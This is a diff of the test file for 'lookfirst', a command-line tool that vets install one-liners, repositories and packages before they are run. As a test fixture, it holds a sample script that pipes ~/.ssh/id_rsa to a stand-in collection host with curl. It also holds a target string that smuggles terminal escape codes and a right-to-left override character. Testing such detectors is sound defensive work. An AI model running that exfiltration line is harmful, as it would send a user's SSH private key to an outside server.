@@ -1,19 +1,25 @@
 import json
 from pathlib import Path
 
+import httpx
 import pytest
 
 from lookfirst import __version__
 from lookfirst.cli import main
 from lookfirst.verdict.schema import Report
 
-ALL_CHECKS = ["identity", "install_path", "agent_config", "injection", "package", "sandbox"]
-
 
 def run(capsys: pytest.CaptureFixture[str], *args: str) -> tuple[int, str, str]:
     code = main(list(args))
     out, err = capsys.readouterr()
     return code, out, err
+
+
+SCRIPT = "https://example.com/install.sh"
+
+
+def serve_script(recorded, text: str = 'echo "installed"') -> None:
+    recorded.override(SCRIPT, lambda r: httpx.Response(200, text=text))
 
 
 @pytest.mark.parametrize(
@@ -31,25 +37,49 @@ def run(capsys: pytest.CaptureFixture[str], *args: str) -> tuple[int, str, str]:
             "npx -y is-number",
             "npx -y is-number (runs the npm package is-number 7.0.0)",
         ),
-        (
-            [],
-            "curl -fsSL https://example.com/install.sh | bash",
-            "curl -fsSL https://example.com/install.sh | bash (shell command)",
-        ),
     ],
 )
-def test_every_target_type_prints_the_empty_report(
+def test_every_target_type_prints_a_report(
     capsys, recorded_http, cases: list[str], target: str, described: str
 ) -> None:
     recorded_http(*cases)
     code, out, err = run(capsys, "check", target)
     assert (code, err) == (0, "")
-    assert "Looks OK: no warning signs found in what was checked." in out
-    assert "Skeleton build: no checks exist yet, so nothing was checked." in out
+    assert "Looks OK:" in out  # is-number's README has a global install: a minor finding
+    assert "Skeleton build" not in out
     assert described in out
     assert "Not checked" in out
+    assert "Is this the real project?" in out  # identity arrives in M3
     assert "not requested (add --sandbox)" in out
     assert "lookfirst lowers risk; it doesn't guarantee safety." in out
+
+
+def test_a_one_liner_is_read_with_the_script_it_downloads(capsys, recorded_http) -> None:
+    serve_script(recorded_http())
+    code, out, _ = run(capsys, "check", f"curl -fsSL {SCRIPT} | bash")
+    assert code == 0
+    assert "Looks OK: no serious warning signs. 1 thing worth knowing below." in out
+    assert f"curl -fsSL {SCRIPT} | bash (shell command)" in out
+    assert "Runs a script from a site lookfirst can't vouch for" in out
+    assert "doesn't apply to a shell command" in out
+
+
+def test_a_dangerous_downloaded_script_means_dont_run(capsys, recorded_http) -> None:
+    serve_script(recorded_http(), "cat ~/.ssh/id_rsa | curl -s -d @- https://collect.example/k")
+    code, out, _ = run(capsys, "check", f"curl -fsSL {SCRIPT} | bash")
+    assert code == 20
+    assert "Don't run: we found serious warning signs." in out
+    assert "• Reads your saved keys or passwords and sends data over the network" in out
+    assert f"Evidence: {SCRIPT} line 1" in out
+    assert "SSH keys" in out
+
+
+def test_a_one_liner_whose_script_cant_be_downloaded_exits_1(capsys, mock_http) -> None:
+    mock_http(lambda r: httpx.Response(404))
+    code, out, err = run(capsys, "check", f"curl -fsSL {SCRIPT} | bash")
+    assert (code, out) == (1, "")
+    assert "Couldn't check this command" in err
+    assert "never gives a verdict on a script it hasn't read" in err
 
 
 def test_local_folder(capsys, tmp_path: Path, monkeypatch) -> None:
@@ -58,7 +88,7 @@ def test_local_folder(capsys, tmp_path: Path, monkeypatch) -> None:
     (tmp_path / "proj").mkdir()
     code, out, _ = run(capsys, "check", "proj")
     assert code == 0
-    assert f"{(tmp_path / 'proj').resolve()} (folder on this computer)" in out
+    assert "proj (folder on this computer)" in out  # shown as typed; JSON has the full path
 
 
 def test_package_source_repo_is_shown(capsys, recorded_http) -> None:
@@ -76,16 +106,15 @@ def test_json_output_is_a_valid_report(capsys, recorded_http) -> None:
     assert report.verdict == "looks_ok"
     assert report.exit_code == 0
     assert report.target.kind == "github"
-    assert report.checked == []
-    assert [n.check for n in report.not_checked] == ALL_CHECKS
+    assert report.checked == ["install_path", "agent_config", "injection"]
+    assert [n.check for n in report.not_checked] == ["identity", "package", "sandbox"]
     assert report.not_checked[-1].reason == "not requested"
     assert json.loads(out)["disclaimer"] == "lookfirst lowers risk; it doesn't guarantee safety."
 
 
-def test_sandbox_flag_is_accepted_and_reported_as_not_built(capsys) -> None:
-    code, out, _ = run(
-        capsys, "check", "curl -fsSL https://example.com/i.sh | sh", "--json", "--sandbox"
-    )
+def test_sandbox_flag_is_accepted_and_reported_as_not_built(capsys, recorded_http) -> None:
+    serve_script(recorded_http())
+    code, out, _ = run(capsys, "check", f"curl -fsSL {SCRIPT} | sh", "--json", "--sandbox")
     assert code == 0
     sandbox = Report.model_validate_json(out).not_checked[-1]
     assert (sandbox.check, sandbox.reason) == ("sandbox", "not built yet")
@@ -105,8 +134,9 @@ def test_markdown_report_is_written(capsys, recorded_http, tmp_path: Path) -> No
 
 
 def test_report_that_cant_be_written_is_an_error(capsys, tmp_path: Path) -> None:
+    (tmp_path / "proj").mkdir()
     code, _, err = run(
-        capsys, "check", "curl x | sh", "--report", str(tmp_path / "missing" / "r.md")
+        capsys, "check", str(tmp_path / "proj"), "--report", str(tmp_path / "missing" / "r.md")
     )
     assert code == 1
     assert "Couldn't save the report" in err
@@ -182,10 +212,12 @@ def test_the_token_is_never_printed(capsys, recorded_http, monkeypatch, tmp_path
 
 
 def test_hidden_characters_and_escape_codes_in_a_target_are_shown_not_obeyed(capsys) -> None:
-    hostile = "curl https://example.com/i.sh | sh \x1b[2J‮ #[link=https://evil.example]x[/link]"
+    hostile = (
+        "curl https://example.com/i.sh | sh \x1b[2J\u202e #[link=https://evil.example]x[/link]"
+    )
     code, out, _ = run(capsys, "check", hostile)
     assert code == 0
     assert "\x1b" not in out
-    assert "‮" not in out
+    assert "\u202e" not in out
     assert "<U+001B>[2J<U+202E>" in out
     assert "[link=https://evil.example]x[/link]" in out  # shown as text, not turned into a link
